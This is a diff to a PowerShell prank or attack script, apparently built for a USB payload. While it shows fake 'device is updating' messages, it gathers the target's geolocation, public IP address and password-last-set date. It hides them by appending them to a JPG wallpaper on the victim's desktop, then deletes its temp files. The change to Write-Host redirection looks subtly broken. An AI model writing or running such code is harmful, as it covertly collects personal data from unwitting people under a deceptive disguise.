@@ -44,6 +44,42 @@ $fullName = Get-fullName
 # Write-Host statement used to track progress while debugging
 Write-Host "Device is updating ..."
 
+
+#############################################################################################################################################
+
+<#
+.NOTES 
+	This is to get the current Latitide and Longitude of your target
+#>
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+$GL = Get-GeoLocation
+
+
 ###########################################################################################################
 
 <#
@@ -127,7 +163,7 @@ function Get-PubIP {
 
     return "your public  I P address is $computerPubIP"
 }
-
+$PubIP = Get-PubIP
 # Write-Host statement used to track progress while debugging
 Write-Host "Update may require more time ..."
 
@@ -357,7 +393,7 @@ if (!$Networks) { Write-Host "Trying ..."
 
 # this is the message that will be coded into the image you use as the wallpaper
 
-	$hiddenMessage = "GM Chamber Live Hack"
+	$hiddenMessage = "GM Chamber Details :-)"
 
 # this will be the name of the image you use as the wallpaper
 
@@ -391,7 +427,10 @@ if (!$Networks) { Write-Host "Trying ..."
 	Then it will clean up the files you don't want to leave behind
 #>
 
-	echo $hiddenMessage > $Env:temp\foo.txt
+	Write-Host $hiddenMessage > $Env:temp\foo.txt
+    if ($GL) { Write-Host "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
+    if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
+    if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
 	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
 
 	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
@@ -471,7 +510,7 @@ Write-Host "All updates done. Finishing installation ..."
 
     }
 }
-
+$pls = Get-Days_Set
 # Write-Host statement used to track progress while debugging
 Write-Host "Finishing installation ..."
 
